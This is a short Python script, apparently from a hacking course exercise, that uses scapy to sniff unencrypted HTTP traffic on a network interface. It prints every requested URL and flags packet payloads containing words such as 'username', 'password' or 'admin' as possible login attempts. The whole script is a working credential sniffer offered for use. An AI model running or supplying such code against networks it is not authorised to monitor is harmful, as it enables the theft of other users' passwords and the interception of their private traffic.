#!/user/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet,filter="port 80")

def get_site(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ['username', 'user', 'login', "pass", "password" , 'admin', 'message']
        for keyword in keywords:
            if keyword in load.lower():
                return (load)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_site(packet)
        print("[+]New HTTP Request > {}".format(url))
        login = get_login(packet)
        if login:
            print('\n\t[+]Possible login attempt > {}\n\n'.format(login))

sniff('eth0')